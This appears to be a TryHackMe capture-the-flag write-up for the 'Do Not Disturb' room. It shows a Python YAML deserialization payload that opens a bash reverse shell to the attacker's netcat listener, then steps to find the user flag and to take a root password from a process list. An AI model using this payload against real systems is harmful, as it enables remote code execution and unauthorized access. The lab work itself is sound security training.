## Hello
<p align="center">
  <img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785328070219&w=96&q=75">
</p>

# Do Not Disturb

In this room, the objective is to exploit a YAML injection vulnerability to gain initial access, establish a reverse shell, and complete the challenge by reaching the target Flags.

Target application:
```
http://MACHINE_IP
```
Goal:
- [x] Obtain user.txt
- [x] Obtain root.txt



## STEP 01

- Check the source code for a hint:
  ```
  The source code contains a comment about login info
  ```
- Then log in to the app


## STEP 02
- Find your `eth0` IP address
- Open a netcat listener in the terminal
  ```bash
  nc -nvlp 2569
  ```
- Then run the YAML payload
  ```bash
  !!python/object/apply:os.system
  - 'bash -c "bash -i >& /dev/tcp/<YOURIP/2569 0>&1"'
  ```
- Now you have access to root
- Check what type of user you are
  ```bash
  whoami
  ```

## STEP 03
- Find the user flag
  ```bash
  find / -name "user.txt" 2>/dev/null
  ```
- Go to the file path
- Open it
  ```bash
  cat user.txt
  ```

## STEP 04
- Find the process that belongs to `root.txt`
  ```bash
  ps aux | grep root.txt
  ```

  > `ps aux` Linux command that displays information about **all currently running processes**. <br>
  > What each part means
    > - ps – Shows information about running processes.
    > - a – Displays processes for all users.
    > - u – Shows the processes in a user-oriented format, including the owner, CPU usage, and memory usage.
    > - x – Includes processes without a controlling terminal, such as background services (daemons).
    > - | - The pipe sends the output of ps aux to the next command.
    > - grep - Searches for matching text
  
- Now you will find two processes, and one process contains the password for root
- Let's access root
  ```bash
  su root
  ```
  > substitute user (or switch user). It allows you to change from your current user account to another user, most commonly the root user.
- Use the `password` you have found
- Then check for the `root.txt`

## You have found the  **TWO FLAGs** 🚩

# Congratulations on our Exploration 🎉
